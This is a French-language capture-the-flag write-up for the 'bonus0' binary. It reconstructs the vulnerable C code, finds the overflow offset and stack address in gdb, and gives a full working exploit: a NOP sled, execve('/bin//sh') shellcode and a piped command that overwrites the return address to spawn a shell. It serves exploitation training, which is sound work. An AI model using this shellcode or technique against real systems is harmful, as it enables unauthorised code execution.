# bonus0

    void p(char *dest) {
        char buffer[4096]; // Alloué à ebp-0x1008
        puts(" - ");
        read(0, buffer, 4096);
        // blablalbalblalbalbal
        char *nl = strchr(buffer, '\n');
        if (nl) {
            *nl = '\0';
        }
        strncpy(dest, buffer, 20); 
        // blablalbalblalbalbal
    }

    void pp(char *out_buf) {
        char buf1[20]; // Alloué à ebp-0x30
        char buf2[20]; // Alloué à ebp-0x1c
        
        p(buf1);
        p(buf2);
        
        strcpy(out_buf, buf1);
        // blablalbalblalbalbalblablalbalblalbalbal\0

        int len = strlen(out_buf);
        // len = 40
        out_buf[len] = ' '; 
        out_buf[len+1] = '\0';
        // blablalbalblalbalbalblablalbalblalbalbal \0
        strcat(out_buf, buf2);
        // blablalbalblalbalbalblablalbalblalbalbal blablalbalblalbalbal\0
    }

    int main() {
        char main_buf[42];
        pp(main_buf);
        // main_buff =  blablalbalblalbalbalblablalbalblalbalbal blablalbalblalbalbal\0
        puts(main_buf);
        return 0;
    }



**Trouver l'offset**

    (gdb) run 
    Starting program: /home/user/bonus0/bonus0 
    - 
    aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa
    - 
    aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa
    aaaabaaacaaadaaaeaaaaaaabaaacaaadaaaeaaa��� aaaabaaacaaadaaaeaaa���
    Program received signal SIGSEGV, Segmentation fault.
    0x64616161 in ?? ()

    0x64616161 = aaad = offset 9

**Trouver l'adresse du buffer**

Pas de tas cette fois, tout se passe sur la pile — donc adresse directe + NOP sled, plus besoin de double indirection ni de tas :

    (gdb) b *p+28
    (gdb) run
    (gdb) x $ebp-0x1008
    0xbfffe680:     0x00000000

**Construire le payload**

    buf1 overflow buf2, plage de NOP pour alignement + le shellcode `execve("/bin//sh")` 

    printf '\x90%.0s' {1..100}; printf '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'; 

    2e ligne, c'est ce qui va réellement écraser l'adresse de retour de `main` via buf2  9 octets de offset jusqu'à cette adresse de retour, puis adresse qui tombe le sled NOP 

    printf 'A%.0s' {1..9}; printf '\xd0\xe6\xff\xbf'; printf 'B%.0s' {1..9}

injection 

    (printf '\x90%.0s' {1..100}; printf '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'; printf '\n'; sleep 0.2; printf 'A%.0s' {1..9}; printf '\xd0\xe6\xff\xbf'; printf 'B%.0s' {1..9}; printf '\n'; cat) | ./bonus0


